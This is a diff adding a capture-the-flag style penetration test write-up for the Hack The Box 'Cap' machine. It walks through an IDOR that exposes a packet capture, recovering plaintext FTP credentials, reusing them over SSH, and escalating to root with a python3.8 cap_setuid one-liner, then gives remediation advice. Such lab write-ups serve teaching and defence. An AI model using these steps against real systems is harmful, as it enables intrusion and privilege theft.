@@ -324,8 +324,534 @@ The application exposed:
 - Security Snapshot
 - IP Configuration
 - Network Status
-
 While the IP Configuration and Network Status pages revealed useful system information, the Security Snapshot feature appeared to reference stored resources using a predictable numeric identifier.
 
 This observation established the basis for focused authorization testing during the Vulnerability Analysis phase.
 
+# Vulnerability Analysis
+
+## Objective
+
+The objective of this phase was to validate whether the functionality identified during enumeration could be abused to access information or resources beyond the intended authorization boundaries.
+
+Particular attention was given to the **Security Snapshot** feature after observing that captured data was referenced using sequential numeric identifiers.
+
+curl http://10.129.79.148/data/1
+
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab9.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab10.png?raw=true)
+
+The request successfully returned the contents of the first stored capture.
+
+The response contained:
+
+- Packet statistics
+- IP packet count
+- TCP packet count
+- UDP packet count
+- Download functionality
+
+  curl -L http://10.129.79.148/capture
+
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab11.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab12.png?raw=true)
+
+Following the redirect automatically caused the application to generate a new capture.
+
+The resulting page referenced a different resource identifier.
+
+Previously:
+
+/download/1
+
+After requesting another capture:
+
+/download/2
+
+# Analysis
+
+The assessment established that the application stores captures using sequential numeric object identifiers.
+
+Each invocation of the capture functionality generated a new identifier while exposing the corresponding download endpoint.
+
+Predictable object identifiers frequently indicate resources that should be protected by server-side authorization checks.
+
+At this stage, no authorization bypass had yet been confirmed. However, the identifier pattern justified further testing to determine whether previously generated captures belonging to other users could be accessed.
+
+# Security Assessment
+
+The observations indicated several characteristics commonly associated with object reference vulnerabilities:
+
+- Predictable numeric identifiers
+- Direct object references in URLs
+- Download functionality tied to object IDs
+- No visible evidence of user-specific identifiers within the URL
+
+These characteristics warranted authorization testing against alternate object identifiers.
+
+The next phase focused on determining whether modifying the object identifier would allow unauthorized access to packet capture files belonging to other users.
+
+curl http://10.129.79.148/data/0
+
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab13.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab14.png?raw=true)
+
+The application successfully returned packet capture statistics for object identifier 0.
+
+The response included:
+
+- Number of packets
+- IP packet count
+- TCP packet count
+- Download button
+
+Download endpoint:
+
+/download/0
+
+curl -I http://10.129.79.148/download/0
+
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab16.png?raw=true)
+
+The server responded with HTTP 200 OK.
+
+Response headers confirmed that a packet capture file could be downloaded.
+
+Content-Disposition:
+attachment; filename=0.pcap
+
+Content-Type:
+application/vnd.tcpdump.pcap
+
+## Finding 1 – Insecure Direct Object Reference (IDOR)
+
+**Severity:** High
+
+**OWASP Top 10:** A01:2021 – Broken Access Control
+
+**CWE:** CWE-639 – Authorization Bypass Through User-Controlled Key
+
+### Description
+
+The Security Snapshot functionality stores packet capture files using sequential numeric identifiers.
+
+Rather than using unpredictable object references or enforcing ownership validation, the application exposes capture data through URLs of the form:
+
+/data/1
+
+/download/0
+
+This implementation allows users to request resources directly by modifying the numeric identifier.
+
+### Objective
+
+I have to determine whether packet capture objects belonging to other users could be accessed by modifying the numeric identifier within the application URLs.
+
+### Testing Methodology
+
+After identifying that packet captures were referenced using sequential identifiers, multiple object IDs were requested manually to evaluate whether server-side authorization controls restricted access to individual resources.
+
+curl http://10.129.79.148/data/3
+
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab15.png?raw=true)
+
+The application redirected the request back to the homepage instead of returning packet capture data.
+
+This behavior indicates that object identifier 3 did not exist rather than demonstrating an authorization failure.
+
+### Analysis
+
+Testing demonstrated that packet capture objects were directly accessible using predictable numeric identifiers.
+
+Object identifier 0 returned valid capture statistics and exposed a downloadable packet capture file.
+
+No authentication or authorization challenge was observed before the application disclosed access to the stored capture.
+
+Because access to the object depended solely on knowledge of the identifier, the application failed to enforce object-level authorization.
+
+### Security Impact
+
+Successful exploitation allows an attacker to access packet capture files that should be restricted to their respective owners.
+
+Packet captures may contain:
+
+- Authentication credentials
+- Session cookies
+- HTTP requests
+- Network metadata
+- Sensitive application traffic
+
+Disclosure of this information can facilitate additional attacks, including credential compromise and unauthorized system access.
+
+### Root Cause
+
+The application uses predictable sequential identifiers to reference stored objects without validating whether the requesting user is authorized to access the selected resource.
+
+Authorization decisions are therefore based solely on user-supplied object identifiers rather than ownership validation.
+
+### Evidence Summary
+
+| Test          | Result                                      |
+| ------------- | ------------------------------------------- |
+| `/capture`    | Created a new packet capture                |
+| `/data/1`     | Displayed capture statistics                |
+| `/data/0`     | Displayed a different capture object        |
+| `/download/0` | Returned HTTP 200 and a downloadable PCAP   |
+| `/data/3`     | Redirected because the object did not exist |
+
+### Conclusion
+
+The assessment confirmed the presence of an Insecure Direct Object Reference (IDOR) vulnerability.
+
+The application permitted direct access to packet capture resources using predictable object identifiers without enforcing appropriate authorization controls.
+
+This weakness enabled unauthorized retrieval of packet capture files, ultimately exposing sensitive information that could be leveraged to obtain valid user credentials during the subsequent exploitation phase.
+
+# Exploitation
+
+## Objective
+
+The objective of this phase was to determine whether the unauthorized packet capture identified during the Vulnerability Analysis phase contained information that could facilitate authenticated access to the target system.
+
+Rather than attempting password guessing or brute-force attacks, the assessment focused on analyzing the exposed packet capture for sensitive information that had been unintentionally disclosed.
+
+### Downloading the Packet Capture
+
+Since the response headers confirmed that a packet capture file could be downloaded, I tried to download and analyze it.
+```bash
+wget http://10.129.79.148/download/0
+mv 0 0.pcap
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab17.png?raw=true)
+
+The application successfully returned the packet capture file associated with object identifier `0`.
+
+The file was downloaded without authentication or authorization checks and saved locally for forensic analysis.
+
+### Packet Capture Analysis
+
+```bash
+tshark -r 0.pcap
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab18.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab19.png?raw=true)
+
+Initial inspection of the packet capture revealed both HTTP and FTP traffic.
+
+The FTP session was of particular interest because authentication exchanges are transmitted in plaintext when FTP is used without encryption.
+
+### Extracting Credentials
+
+```bash
+strings 0.pcap
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab20.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab21.png?raw=true)
+
+The packet capture contained plaintext FTP authentication credentials.
+
+Because FTP does not encrypt authentication traffic, both the username and password were directly recoverable from the capture without requiring any cryptographic attacks or protocol manipulation.
+
+The successful login response further confirmed that the credentials were valid at the time the traffic was captured.
+
+USER nathan
+PASS Buck3tH4TF0RM3!
+230 Login successful.
+
+### Protocol Validation
+
+```bash
+tshark -r 0.pcap -Y http
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab22.png?raw=true)
+
+Filtering the capture for HTTP traffic confirmed normal web requests associated with the application.
+
+This helped separate routine web activity from the FTP authentication exchange, allowing the analysis to focus on the credentials exposed over FTP.
+
+### Initial Access
+
+```bash
+ssh nathan@10.129.79.148
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab23.png?raw=true)
+
+The recovered credentials were successfully reused to authenticate to the SSH service.
+
+Authentication succeeded without requiring any additional exploitation, providing an interactive shell as the user `nathan`.
+
+# Local Enumeration
+
+## Objective
+
+Following successful authentication to the target via SSH, the objective of this phase was to identify opportunities for privilege escalation.
+
+Enumeration focused on understanding the operating environment, user permissions, operating system configuration, and common Linux privilege escalation vectors before attempting any exploitation.
+
+A structured enumeration methodology was used to minimize assumptions and ensure that all findings were supported by observable evidence.
+
+### Initial Access Verification
+
+# Purpose
+
+Before performing system enumeration, access to the host was verified and the current execution context established.
+
+```bash
+whoami
+id
+hostname
+pwd
+```
+
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab24.png?raw=true)
+
+### Analysis
+
+The compromised account was identified as `nathan`, a standard non-privileged Linux user.
+
+The output confirmed that the session did not possess administrative privileges and therefore required privilege escalation to obtain full control of the system.
+
+Establishing the current execution context is an essential first step because it determines the privileges available to the attacker and guides subsequent enumeration activities.
+
+```bash
+uname -a
+cat /etc/os-release
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab25.png?raw=true)
+
+The target system was identified as:
+
+- Ubuntu 20.04.2 LTS (Focal Fossa)
+- Linux Kernel 5.4.0-80-generic
+- x86_64 architecture
+
+  ### Analysis
+
+Identifying the operating system and kernel version is a critical enumeration step because many privilege escalation techniques depend on the underlying platform and software versions.
+
+At this stage of the assessment, the operating system information was recorded to support subsequent privilege escalation research and to identify host-specific attack vectors.
+
+### Sudo Privilege Assessment
+
+```bash
+sudo -i
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab26.png?raw=true)
+
+The user nathan is not in the sudoers file.
+
+### Analysis
+
+The assessment confirmed that the compromised user was not permitted to execute commands with sudo.
+
+This eliminated straightforward administrative access through sudo misconfigurations and indicated that alternative privilege escalation vectors would need to be investigated.
+> **My Observation**
+>
+> Verifying sudo permissions early in the enumeration process helps quickly determine whether administrative access is already available or whether additional investigation is required. Since the user lacked sudo privileges, subsequent efforts focused on identifying other privilege escalation mechanisms.
+
+## Enumeration Summary
+
+Initial host enumeration established the following:
+
+- Authenticated access was obtained as the user `nathan`.
+- The target was running Ubuntu 20.04.2 LTS.
+- The Linux kernel version was 5.4.0-80-generic.
+- The compromised account did not possess sudo privileges.
+
+These findings indicated that privilege escalation would require identifying alternative mechanisms beyond standard administrative delegation.
+
+# Privilege Escalation Enumeration
+
+## Objective
+
+The objective of this phase was to identify local privilege escalation opportunities available to the compromised user account.
+
+Rather than relying on automated exploitation, common Linux privilege escalation vectors were systematically evaluated, including Linux capabilities, SUID binaries, scheduled tasks, and filesystem permissions.
+
+This structured approach ensures that privilege escalation attempts are evidence-driven and minimizes the likelihood of overlooking viable attack paths.
+
+## Linux Capability Enumeration
+
+Linux capabilities provide fine-grained privilege assignments that allow executables to perform specific privileged operations without requiring full root privileges.
+
+Misconfigured capabilities assigned to general-purpose executables can introduce significant security risks and therefore represent an important privilege escalation vector during Linux assessments.
+
+```bash
+getcap -r / 2>/dev/null
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab27.png?raw=true)
+
+| Binary                         | Capability                              | Assessment                         |
+| ------------------------------ | --------------------------------------- | ---------------------------------- |
+| `/usr/bin/python3.8`           | `cap_setuid`, `cap_net_bind_service`    | **Requires Investigation**         |
+| `/usr/bin/ping`                | `cap_net_raw`                           | Expected                           |
+| `/usr/bin/mtr-packet`          | `cap_net_raw`                           | Expected                           |
+| `/usr/bin/traceroute6.iputils` | `cap_net_raw`                           | Expected                           |
+| `gst-ptp-helper`               | `cap_net_bind_service`, `cap_net_admin` | Expected for service functionality |
+
+### Analysis
+
+The capability enumeration identified several binaries with elevated Linux capabilities.
+
+Most observed capabilities were consistent with their intended functionality and did not present an immediate privilege escalation opportunity.
+
+However, the Python 3.8 interpreter was assigned the `cap_setuid` capability, which is unusual for a general-purpose scripting interpreter.
+
+Because `cap_setuid` permits a process to change its effective user ID, this finding was prioritized for further investigation as a potential privilege escalation vector.
+
+> **My Observation**
+>
+> During Linux privilege escalation assessments, general-purpose interpreters such as Python, Perl, or Ruby should not normally possess capabilities that allow privilege modification. Their presence warrants immediate investigation because they may permit arbitrary code execution with elevated privileges.
+
+```bash
+crontab -l
+ls -la /etc/cron*
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab28.png?raw=true)
+
+The assessment identified standard system cron directories and scheduled maintenance tasks.
+
+No user-specific cron jobs or writable scheduled tasks were identified.
+
+### Analysis
+
+Scheduled task enumeration did not reveal any misconfigurations or user-controlled scripts that could be leveraged for privilege escalation.
+
+The observed cron entries corresponded to standard Ubuntu maintenance activities.
+
+### SUID Enumeration
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab29.png?raw=true)
+
+| Binary      | Status   |
+| ----------- | -------- |
+| sudo        | Standard |
+| su          | Standard |
+| passwd      | Standard |
+| mount       | Standard |
+| umount      | Standard |
+| pkexec      | Present  |
+| ssh-keysign | Standard |
+
+Enumeration identified multiple SUID binaries commonly present on Ubuntu systems.
+
+No immediately exploitable custom binaries or application-specific SUID executables were observed during manual review.
+
+Although `pkexec` was present, exploitation was not attempted because the assessment had already identified a higher-confidence privilege escalation vector through Linux capabilities.
+
+### Capability Validation
+
+```bash
+getcap /usr/bin/python3.8
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab30.png?raw=true)
+
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+
+### Analysis
+
+The capability assignment confirmed that the Python 3.8 interpreter possessed the `cap_setuid` capability.
+
+Unlike standard Linux capability assignments that are typically limited to specialized system utilities, granting `cap_setuid` to a general-purpose scripting interpreter significantly increases the risk of privilege escalation because arbitrary code executed through the interpreter can request a change to the effective user ID.
+
+### Exploitation
+```bash
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab31.png?raw=true)
+
+The Python interpreter successfully invoked the `setuid(0)` system call and spawned a new shell with an effective user ID of 0.
+
+Verification commands confirmed that the assessment obtained administrative privileges on the target host.
+
+This demonstrated that the capability assignment was sufficient to bypass normal privilege separation and provide unrestricted access to the operating system.
+
+### Root Verification
+
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab34.png?raw=true)
+
+Access to the `/root` directory confirmed complete administrative control of the target system.
+
+At this stage, the assessment objectives had been achieved, demonstrating a successful privilege escalation from a standard user account to the root account.
+
+## Security Impact
+
+Successful exploitation of the capability assignment resulted in complete compromise of the target host.
+
+An attacker obtaining a shell as a non-privileged user could:
+
+- Execute commands with root privileges.
+- Access all files and directories.
+- Modify system configuration.
+- Install persistent mechanisms.
+- Create privileged accounts.
+- Disable security controls.
+- Exfiltrate sensitive data.
+
+This finding represents a complete loss of confidentiality, integrity, and availability for the affected system.
+
+## Root Cause
+
+The Python interpreter was assigned the `cap_setuid` Linux capability.
+
+General-purpose interpreters should not normally possess capabilities that allow modification of process privileges because they enable arbitrary user-supplied code to execute privileged system calls.
+
+The misconfiguration violated the principle of least privilege and directly enabled local privilege escalation.
+
+### MITRE ATT&CK Mapping
+
+| Tactic               | Technique      | Description                            |
+| -------------------- | -------------- | -------------------------------------- |
+| Discovery            | T1082          | System Information Discovery           |
+| Discovery            | T1046          | Network Service Discovery              |
+| Credential Access    | T1552          | Unsecured Credentials                  |
+| Initial Access       | Valid Accounts | SSH access using recovered credentials |
+| Privilege Escalation | T1548          | Abuse Elevation Control Mechanism      |
+
+### Findings Summary
+
+| ID   | Finding                               | Severity | Status    |
+| ---- | ------------------------------------- | -------- | --------- |
+| F-01 | Broken Access Control (IDOR)          | High     | Confirmed |
+| F-02 | Sensitive Information Disclosure      | High     | Confirmed |
+| F-03 | Credential Exposure in FTP Traffic    | High     | Confirmed |
+| F-04 | Excessive Linux Capability Assignment | Critical | Confirmed |
+
+### Remediation Recommendations
+
+## F-01 – Broken Access Control
+
+Enforce object-level authorization checks on every request.
+Avoid predictable sequential object identifiers.
+Validate ownership before serving resources.
+
+## F-02 – Sensitive Information Disclosure
+Restrict access to packet capture files.
+Encrypt sensitive network captures at rest.
+Limit retention of diagnostic captures.
+
+## F-03 – Credential Exposure
+Replace FTP with encrypted alternatives such as SFTP or FTPS.
+Disable plaintext authentication protocols.
+Rotate exposed credentials immediately.
+
+## F-04 – Linux Capability Misconfiguration
+Remove the cap_setuid capability from /usr/bin/python3.8.
+Assign capabilities only to binaries that require them for their intended function.
+Periodically audit Linux capabilities as part of system hardening.
+
+# Lessons Learned
+
+This assessment demonstrated how multiple individually manageable weaknesses can be chained to achieve complete system compromise.
+
+Key observations include:
+
+- Thorough enumeration is essential for identifying meaningful attack paths.
+- Predictable object references should always be tested for authorization enforcement.
+- Diagnostic data such as packet captures may contain highly sensitive information and require appropriate access controls.
+- Plaintext protocols such as FTP expose credentials to anyone with access to captured traffic.
+- Local privilege escalation should be preceded by systematic enumeration rather than immediate exploitation attempts.
+- Linux capabilities should be audited alongside SUID binaries during privilege escalation assessments because inappropriate capability assignments can provide direct paths to administrative access.
